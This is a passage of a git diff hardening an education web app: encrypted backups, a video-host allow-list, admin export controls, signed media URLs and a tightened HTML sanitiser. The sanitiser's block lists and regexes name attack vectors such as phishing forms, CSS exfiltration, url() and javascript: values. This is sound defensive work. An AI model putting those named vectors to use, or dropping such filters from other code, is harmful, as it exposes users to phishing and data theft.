++  return crypto.subtle.deriveKey({ name: "PBKDF2", salt, iterations: iter, hash: "SHA-256" }, base, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
++}
++export async function encryptBackup(text, passphrase, iter = ITER) {
++  if (!passphrase || passphrase.length < 12) throw new Error("Passphrase must be at least 12 characters.");
++  const salt = crypto.getRandomValues(new Uint8Array(16)), iv = crypto.getRandomValues(new Uint8Array(12));
++  const ct = new Uint8Array(await crypto.subtle.encrypt({ name: "AES-GCM", iv }, await key(passphrase, salt, iter), enc.encode(text)));
++  return JSON.stringify({ format: "elab-backup-enc-v1", kdf: "PBKDF2-SHA256", iter, salt: b64(salt), iv: b64(iv), data: b64(ct) });
++}
++export async function decryptBackup(envelope, passphrase) {
++  const e = typeof envelope === "string" ? JSON.parse(envelope) : envelope;
++  if (e?.format !== "elab-backup-enc-v1") throw new Error("Not an encrypted e-Lab backup.");
++  try { return dec.decode(await crypto.subtle.decrypt({ name: "AES-GCM", iv: unb64(e.iv) }, await key(passphrase, unb64(e.salt), e.iter), unb64(e.data))); }
++  catch { throw new Error("Wrong passphrase or damaged file."); }
++}
+diff --git a/src/lib/embedUrl.js b/src/lib/embedUrl.js
+new file mode 100644
+index 0000000..4bcb427
+--- /dev/null
++++ b/src/lib/embedUrl.js
+@@ -0,0 +1,34 @@
++// Decides how a Learn "video" block URL may be shown. PURE (no DOM, no React) so it is unit-testable.
++//   kind "embed"  -> https iframe from an explicit allow-list (YouTube, Vimeo player)
++//   kind "direct" -> a media file we host (Supabase storage host, or a plain .mp4/.webm/.mov https URL)
++//   kind "link"   -> any other https URL: shown as a link, NEVER framed
++//   kind "none"   -> empty / non-https / unparseable: nothing is rendered from it
++// Replaces substring host tests (`hostname.includes("youtube.com")` would accept "evilyoutube.com").
++const YOUTUBE_HOSTS = new Set(["www.youtube.com", "youtube.com", "m.youtube.com", "www.youtube-nocookie.com"]);
++const VIMEO_HOSTS = new Set(["vimeo.com", "www.vimeo.com", "player.vimeo.com"]);
++const DIRECT_FILE = /\.(mp4|webm|mov)$/i;
++
++export function classifyVideoUrl(raw, { storageHost = "" } = {}) {
++  if (!raw || typeof raw !== "string") return { kind: "none", url: "" };
++  let u;
++  try { u = new URL(raw.trim()); } catch { return { kind: "none", url: "" }; }
++  if (u.protocol !== "https:") return { kind: "none", url: "" };
++  const host = u.hostname.toLowerCase();
++
++  if (YOUTUBE_HOSTS.has(host)) {
++    if (u.pathname.startsWith("/embed/")) return { kind: "embed", url: `https://www.youtube.com${u.pathname}${u.search}` };
++    const id = u.searchParams.get("v");
++    if (id && /^[\w-]{6,20}$/.test(id)) return { kind: "embed", url: `https://www.youtube.com/embed/${id}` };
++    return { kind: "link", url: u.href };
++  }
++  if (host === "youtu.be") {
++    const id = u.pathname.slice(1);
++    return /^[\w-]{6,20}$/.test(id) ? { kind: "embed", url: `https://www.youtube.com/embed/${id}` } : { kind: "link", url: u.href };
++  }
++  if (VIMEO_HOSTS.has(host)) {
++    const id = u.pathname.split("/").filter(Boolean).pop();
++    return id && /^\d+$/.test(id) ? { kind: "embed", url: `https://player.vimeo.com/video/${id}` } : { kind: "link", url: u.href };
++  }
++  if ((storageHost && host === storageHost.toLowerCase()) || DIRECT_FILE.test(u.pathname)) return { kind: "direct", url: u.href };
++  return { kind: "link", url: u.href };
++}
+diff --git a/src/lib/exportPolicy.js b/src/lib/exportPolicy.js
+new file mode 100644
+index 0000000..c1ebd76
+--- /dev/null
++++ b/src/lib/exportPolicy.js
+@@ -0,0 +1,37 @@
++import { useEffect, useState } from "react";
++import { supabase, isSupabaseConfigured } from "./supabaseClient.js";
++
++import { DEFAULT_EXPORT_POLICY, resolveExportPolicy } from "./exportPolicyCore.js";
++export { DEFAULT_EXPORT_POLICY, resolveExportPolicy };
++
++let cached = null;
++let inflight = null;
++export function __resetExportPolicyCacheForTests() { cached = null; inflight = null; }
++
++async function loadExportPolicy(client = supabase) {
++  if (cached) return cached;
++  if (!inflight) {
++    inflight = (async () => {
++      try {
++        const { data, error } = await client.from("platform_export_policy").select("*").maybeSingle();
++        cached = error || !data ? DEFAULT_EXPORT_POLICY : resolveExportPolicy(data);
++      } catch {
++        cached = DEFAULT_EXPORT_POLICY;
++      }
++      return cached;
++    })();
++  }
++  return inflight;
++}
++export { loadExportPolicy };
++
++export function useExportPolicy() {
++  const [policy, setPolicy] = useState(cached ?? DEFAULT_EXPORT_POLICY);
++  useEffect(() => {
++    if (!isSupabaseConfigured || cached) return undefined;
++    let alive = true;
++    loadExportPolicy().then((p) => { if (alive) setPolicy(p); });
++    return () => { alive = false; };
++  }, []);
++  return policy;
++}
+diff --git a/src/lib/exportPolicyCore.js b/src/lib/exportPolicyCore.js
+new file mode 100644
+index 0000000..846afd4
+--- /dev/null
++++ b/src/lib/exportPolicyCore.js
+@@ -0,0 +1,15 @@
++// PURE half of exportPolicy.js (no Supabase import) so it is unit-testable without a browser environment.
++// What application-provided download / export controls may be SHOWN right now.
++//   allowResourceDownloads  mirrors platform_settings.allow_resource_downloads. For resource FILES the database enforces it too
++//                           (storage policy, sql/032) -- this only keeps the UI honest.
++//   allowTeacherExports     Q Builder Export PDF / Export Word / Print buttons. UI control only (files are generated in the browser).
++// A missing view/column (migration 025 not applied yet) or a failed read means "current behaviour": allowed.
++export const DEFAULT_EXPORT_POLICY = Object.freeze({ allowResourceDownloads: true, allowTeacherExports: true });
++
++export function resolveExportPolicy(row) {
++  return {
++    allowResourceDownloads: row?.allow_resource_downloads !== false,
++    allowTeacherExports: row?.allow_teacher_exports !== false,
++  };
++}
++
+diff --git a/src/lib/learnContentService.js b/src/lib/learnContentService.js
+index f882b68..8c330b0 100644
+--- a/src/lib/learnContentService.js
++++ b/src/lib/learnContentService.js
+@@ -1,3 +1,4 @@
++import { createAsyncCache } from "./asyncCache.js";
+ import { supabase } from "./supabaseClient.js";
+ import { canStudentAccessLessonLevel, lessonOrderValue, normalizeStudentLevel } from "./learnLevelAccess.js";
+ 
+@@ -19,6 +20,7 @@ export async function listLessonsForTopic(parentTopic, flowLevel = "SL") {
+ 
+ 
+ export async function reorderLessons(pageIds, flowLevel = "SL") {
++  catalogCache.clear();
+   if (!supabase) throw new Error("Not connected to Supabase.");
+   const ids = (pageIds || []).filter(Boolean);
+   const orderField = normalizeStudentLevel(flowLevel) === "HL" ? "display_order_hl" : "display_order_sl";
+@@ -41,6 +43,7 @@ export async function getLesson(pageId) {
+ }
+ 
+ export async function createLesson(fields) {
++  catalogCache.clear();
+   if (!supabase) throw new Error("Not connected to Supabase.");
+   const { data: userData } = await supabase.auth.getUser();
+ 
+@@ -75,6 +78,7 @@ export async function createLesson(fields) {
+ }
+ 
+ export async function updateLesson(pageId, fields) {
++  catalogCache.clear();
+   if (!supabase) throw new Error("Not connected to Supabase.");
+   const updates = {
+     parent_topic: fields.parentTopic,
+@@ -97,12 +101,14 @@ export async function updateLesson(pageId, fields) {
+ }
+ 
+ export async function saveLessonAsDraft(pageId) {
++  catalogCache.clear();
+   if (!supabase) return;
+   const { error } = await supabase.from("learn_pages").update({ status: "draft" }).eq("id", pageId);
+   if (error) throw error;
+ }
+ 
+ export async function publishLesson(pageId) {
++  catalogCache.clear();
+   if (!supabase) throw new Error("Not connected to Supabase.");
+   const { data, error } = await supabase.rpc("publish_learn_page", { p_page_id: pageId });
+   if (error) throw error;
+@@ -110,6 +116,7 @@ export async function publishLesson(pageId) {
+ }
+ 
+ export async function deleteLesson(pageId) {
++  catalogCache.clear();
+   if (!supabase) return;
+   const { error } = await supabase.from("learn_pages").delete().eq("id", pageId);
+   if (error) throw error;
+@@ -285,7 +292,13 @@ export async function reorderCheckQuestions(items) {
+ // ============================================================
+ 
+ /** Lightweight metadata ONLY — for the sidebar. Never fetches blocks. */
+-export async function listPublishedLessonMeta(studentLevel = "HL") {
++// 60 s cache + in-flight de-duplication: the sidebar, lesson page, search and welcome page all ask for the same catalogue.
++const catalogCache = createAsyncCache({ ttlMs: 60_000 });
++export function clearLessonCatalogCache() { catalogCache.clear(); }
++export function listPublishedLessonMeta(studentLevel = "HL") {
++  return catalogCache.get(normalizeStudentLevel(studentLevel), () => fetchPublishedLessonMeta(studentLevel));
++}
++async function fetchPublishedLessonMeta(studentLevel) {
+   if (!supabase) return [];
+   const learner = normalizeStudentLevel(studentLevel);
+   const orderField = learner === "HL" ? "display_order_hl" : "display_order_sl";
+diff --git a/src/lib/lessonDeliveryClient.js b/src/lib/lessonDeliveryClient.js
+new file mode 100644
+index 0000000..83914cd
+--- /dev/null
++++ b/src/lib/lessonDeliveryClient.js
+@@ -0,0 +1,33 @@
++// DRAFT (docs/security-plan P4) -- NOT applied. Client for the DATABASE-phase RPCs list_lesson_catalog / get_lesson_page (sql/040).
++// Dependency-injected `rpc` so it is testable without Supabase. Mirrors the shapes of listPublishedLessonMeta / getPublishedLesson.
++// Legacy fallback (direct table reads) is used ONLY while the RPCs are not deployed (PostgREST 404 / SQLSTATE 42883 / PGRST202) and is
++// counted so you can see when it is safe to run sql/041 (which removes direct reads). After 041, the fallback fails closed.
++export const fallbackStats = { count: 0 };
++const MISSING = (e) => e && (e.code === "42883" || e.code === "PGRST202" || e.status === 404 || /could not find the function/i.test(e.message || ""));
++
++export function createLessonDeliveryClient({ rpc, legacy, pageSize = 400 }) {
++  async function catalog(level) {
++    const { data, error } = await rpc("list_lesson_catalog", { p_limit: 500, p_offset: 0 });
++    if (error) {
++      if (MISSING(error) && legacy?.listMeta) { fallbackStats.count++; return legacy.listMeta(level); }
++      throw error;
++    }
++    return data || [];
++  }
++  async function lesson(pageId) {
++    const blocks = []; let offset = 0; let page = null; let guard = 0;
++    for (;;) {
++      const { data, error } = await rpc("get_lesson_page", { p_page_id: pageId, p_offset: offset, p_limit: pageSize });
++      if (error) {
++        if (MISSING(error) && legacy?.getLesson && offset === 0) { fallbackStats.count++; return legacy.getLesson(pageId); }
++        throw error;
++      }
++      if (!data?.ok) { const e = new Error(data?.error === "rate_limited" ? "Too many lessons opened too quickly. Please wait a moment." : "This lesson is not available."); e.code = data?.error || "denied"; throw e; }
++      page = page || data.page; blocks.push(...(data.blocks || []));
++      if (!data.has_more || ++guard > 50) break;
++      offset = data.next_offset;
++    }
++    return { page, blocks };
++  }
++  return { catalog, lesson };
++}
+diff --git a/src/lib/resolveStorageRefs.js b/src/lib/resolveStorageRefs.js
+new file mode 100644
+index 0000000..70115da
+--- /dev/null
++++ b/src/lib/resolveStorageRefs.js
+@@ -0,0 +1,31 @@
++// DRAFT (docs/security-plan P5) -- NOT applied. Turns "storage://<bucket>/<path>" references (written by sql/050 rewrite_media_refs for
++// lessons whose media_mode='private') into short-lived signed URLs. https/legacy public URLs pass through untouched, so unmigrated
++// lessons and demo images behave exactly as today. `signer(bucket, paths)` = supabase.storage.from(bucket).createSignedUrls(paths, ttl).
++// NOTE: a signed URL does not stop an authorised user saving what they see; it stops unauthenticated/expired bulk fetching and listing.
++const REF = /storage:\/\/([a-z0-9-]+)\/([^\s"'<>)]+)/gi;
++
++export function collectRefs(value, out = new Map()) {
++  if (typeof value === "string") { for (const m of value.matchAll(REF)) { if (!out.has(m[1])) out.set(m[1], new Set()); out.get(m[1]).add(m[2]); } }
++  else if (Array.isArray(value)) value.forEach((v) => collectRefs(v, out));
++  else if (value && typeof value === "object") Object.values(value).forEach((v) => collectRefs(v, out));
++  return out;
++}
++export function applyUrls(value, urlOf) {
++  if (typeof value === "string") return value.replace(REF, (all, b, p) => urlOf.get(`${b}/${p}`) || "");
++  if (Array.isArray(value)) return value.map((v) => applyUrls(v, urlOf));
++  if (value && typeof value === "object") return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, applyUrls(v, urlOf)]));
++  return value;
++}
++export async function resolveStorageRefs(content, signer, { ttlSeconds = 600 } = {}) {
++  const refs = collectRefs(content);
++  if (!refs.size) return { content, expiresAt: null };
++  const urlOf = new Map();
++  for (const [bucket, paths] of refs) {
++    const { data, error } = await signer(bucket, [...paths], ttlSeconds);
++    if (error) throw error;
++    for (const row of data || []) if (row.signedUrl && !row.error) urlOf.set(`${bucket}/${row.path}`, row.signedUrl);
++  }
++  return { content: applyUrls(content, urlOf), expiresAt: Date.now() + ttlSeconds * 1000 };
++}
++// Refresh before expiry (call from the lesson page on a timer / visibilitychange): safe margin of 60 s.
++export const needsRefresh = (expiresAt, now = Date.now()) => expiresAt != null && now > expiresAt - 60_000;
+diff --git a/src/lib/sanitizeHtml.js b/src/lib/sanitizeHtml.js
+index adf2f6a..799e679 100644
+--- a/src/lib/sanitizeHtml.js
++++ b/src/lib/sanitizeHtml.js
+@@ -1,12 +1,72 @@
+ import DOMPurify from "dompurify";
+ 
+-// The one sanitiser for Learn rich-text HTML (editor paste, student render,
+-// admin preview). DOMPurify's default allowlist already keeps everything the
+-// Rich Text editor emits: h1-h4, p, span[style] (font-size/-family, color,
+-// background-color), b/i/u/s/sub/sup, ul/ol/li, a[href], and style="text-align"
+-// / "margin-left" on blocks. `style` and `color` are added explicitly so this
+-// stays true if DOMPurify's defaults ever change; tests in
+-// scripts/test-rich-text-selection.mjs lock the round trip in.
+-export function sanitizeHtml(html) {
+-  return DOMPurify.sanitize(html || "", { ADD_ATTR: ["style", "color"] });
++// The one sanitiser for Learn rich-text HTML (editor paste, student render, admin preview). DOMPurify's default allowlist
++// already keeps everything the Rich Text editor emits: h1-h4, p, span[style] (font-size/-family, color, background-color),
++// b/i/u/s/sub/sup, ul/ol/li, a[href], img, table, and style="text-align" / "margin-left" on blocks. `style` and `color` are added
++// explicitly so this stays true if DOMPurify's defaults ever change; scripts/test-rich-text-selection.mjs locks the round trip in.
++//
++// HARDENING over the previous one-liner (audit C-APP-03). Content is admin-authored, so these are defence in depth against a
++// compromised admin session or a crafted backup restore planting a phishing panel inside a trusted lesson:
++//   * no form controls / style blocks / svg / math / media / frames  (credential-phishing forms, CSS exfiltration, mXSS vectors)
++//   * inline style declarations that can build a full-page overlay (position, inset, top/left/right/bottom, z-index,
++//     pointer-events) or fetch/execute things (url(), expression(), @import, behavior, -moz-binding, CSS escapes) are removed;
++//     all other declarations are untouched, so existing lesson formatting is preserved
++//   * OPTIONAL: restrict <img> to given hosts (allowedImageHosts). OFF by default -- turn on only after scanning the lesson corpus
++//     for external images (sql/00_preflight_readonly.sql Q33).
++// NOT a copy-protection mechanism and NOT a substitute for a CSP.
++
++const FORBID_TAGS = ["form", "input", "button", "textarea", "select", "option", "label", "fieldset", "style", "link", "meta", "base",
++  "svg", "math", "video", "audio", "source", "track", "iframe", "frame", "frameset", "object", "embed", "applet", "template", "noscript"];
++const FORBID_ATTR = ["srcset", "formaction", "action", "ping", "poster", "background"];
++const BLOCKED_STYLE_PROPS = /^(position|inset(-[a-z]+)*|top|left|right|bottom|z-index|behavior|-moz-binding|pointer-events)$/i;
++const BLOCKED_STYLE_VALUES = /url\s*\(|expression\s*\(|javascript\s*:|vbscript\s*:|@import|\\|<|>/i;
++
++export function filterStyleAttribute(value) {
++  return String(value || "")
++    .split(";")
++    .map((d) => d.trim())
++    .filter((d) => {
++      if (!d) return false;
++      const i = d.indexOf(":");
++      if (i < 1) return false;
++      const prop = d.slice(0, i).trim();
++      const val = d.slice(i + 1).trim();
++      return !BLOCKED_STYLE_PROPS.test(prop) && !BLOCKED_STYLE_VALUES.test(val) && !BLOCKED_STYLE_VALUES.test(prop);
++    })
++    .join("; ");
++}
++
++let purify = null;
++let activeImageHosts = null;
++function getPurify() {
++  if (purify) return purify;
++  purify = DOMPurify(typeof window !== "undefined" ? window : undefined); // own instance: hooks must not leak into other DOMPurify users (jsPDF)
++  purify.addHook("uponSanitizeAttribute", (_node, data) => {
++    if (data.attrName === "style") {
++      const cleaned = filterStyleAttribute(data.attrValue);
++      if (cleaned) data.attrValue = cleaned; else data.keepAttr = false;
++    }
++  });
++  purify.addHook("afterSanitizeAttributes", (node) => {
++    if (node.tagName === "IMG" && activeImageHosts) {
++      const src = node.getAttribute("src") || "";
++      if (/^(https?:)?\/\//i.test(src)) {
++        let host = "";
++        try { host = new URL(src, "https://x.invalid").hostname.toLowerCase(); } catch { /* drop below */ }
++        if (!activeImageHosts.has(host)) node.removeAttribute("src");
++      }
++    }
++    if (node.tagName === "A" && node.hasAttribute("target")) node.setAttribute("rel", "noopener noreferrer");
++  });
++  return purify;
++}
++
++export function sanitizeHtml(html, { allowedImageHosts = null } = {}) {
++  const p = getPurify();
++  activeImageHosts = allowedImageHosts ? new Set(allowedImageHosts.map((h) => String(h).toLowerCase())) : null;
++  try {
++    return p.sanitize(html || "", { ADD_ATTR: ["style", "color"], FORBID_TAGS, FORBID_ATTR });
++  } finally {
++    activeImageHosts = null;
++  }
+ }
+diff --git a/src/pages/student/resources/components/ResourceCard.jsx b/src/pages/student/resources/components/ResourceCard.jsx
+index 5df4aca..8517c49 100644
+--- a/src/pages/student/resources/components/ResourceCard.jsx
++++ b/src/pages/student/resources/components/ResourceCard.jsx
+@@ -3,6 +3,7 @@ import { FileText, Download, ExternalLink, Lock, Loader2 } from "lucide-react";
+ import Card from "../../../../components/ui/Card.jsx";
+ import Badge from "../../../../components/ui/Badge.jsx";
+ import { openResource } from "../../../../lib/useVisibleResources.js";
++import { useExportPolicy } from "../../../../lib/exportPolicy.js";
+ 
+ // Extended (not replaced) to additionally support Supabase-backed
+ // resources, which carry `isLocked`/`needsSignedUrl` instead of a direct
+@@ -11,7 +12,11 @@ import { openResource } from "../../../../lib/useVisibleResources.js";
+ export default function ResourceCard({ resource }) {
+   const [opening, setOpening] = useState(false);
+   const isExternal = Boolean(resource.externalUrl) && !resource.needsSignedUrl;
+-  const isLocked = Boolean(resource.isLocked);
++  // Admin switch (platform_settings.allow_resource_downloads). Files are ALSO closed in the database when it is off (sql/032), so
++  // this only keeps the button honest. External links and static catalogue entries are unaffected.
++  const { allowResourceDownloads } = useExportPolicy();
++  const downloadsOff = !allowResourceDownloads && Boolean(resource.needsSignedUrl);
++  const isLocked = Boolean(resource.isLocked) || downloadsOff;
+ 
+   async function handleOpen(e) {
+     if (!resource.needsSignedUrl && !isExternal) return; // plain <a href> already handles this case
+@@ -50,7 +55,7 @@ export default function ResourceCard({ resource }) {
+ 
+       {isLocked ? (
+         <span className="inline-flex shrink-0 items-center gap-1.5 rounded-md border border-[var(--color-line)] px-3 py-2 text-sm text-[var(--color-ink-faint)]">
+-          <Lock size={14} /> Locked
++          <Lock size={14} /> {downloadsOff ? "Unavailable" : "Locked"}
+         </span>
+       ) : (
+         <a
+diff --git a/src/pages/teacher/qbuilder/components/ExportControls.jsx b/src/pages/teacher/qbuilder/components/ExportControls.jsx
+index 8d93114..59d9855 100644
+--- a/src/pages/teacher/qbuilder/components/ExportControls.jsx
++++ b/src/pages/teacher/qbuilder/components/ExportControls.jsx
+@@ -1,9 +1,11 @@
+ import { useState } from "react";
+ import { FileDown, FileType, Printer } from "lucide-react";
+ import { exportPdf, exportDocx } from "../lib/export.js";
++import { useExportPolicy } from "../../../../lib/exportPolicy.js";
+ 
+ export default function ExportControls({ draft, totalMarks, mode }) {
+   const [busy, setBusy] = useState(false);
++  const { allowTeacherExports } = useExportPolicy();
+ 
+   async function handleDocx() {
+     setBusy(true);
+@@ -14,6 +16,10 @@ export default function ExportControls({ draft, totalMarks, mode }) {
+     }
+   }
+ 
++  if (!allowTeacherExports) {
++    return <p className="qbuilder-chrome text-xs text-[var(--color-ink-faint)]">Exporting is currently disabled by the administrator.</p>;
++  }
++
+   return (
+     <div className="qbuilder-chrome flex flex-wrap gap-2">
+       <button
+diff --git a/vite.config.js b/vite.config.js
+index a3a6628..e47adfe 100644
+--- a/vite.config.js
++++ b/vite.config.js
+@@ -5,4 +5,11 @@ import { defineConfig } from 'vite'
+ // https://vite.dev/config/
+ export default defineConfig({
+   plugins: [react(), tailwindcss()],
++  build: {
++    // Never publish source maps: they would expose the original, unminified source of every
++    // engine and page. This is the Vite default; stating it makes an accidental change visible
++    // in review and in scripts/check-build-security.mjs. (Minified JS is still readable --
++    // see docs/security-plan section 11; this is not a confidentiality control for shipped code.)
++    sourcemap: false,
++  },
+ })
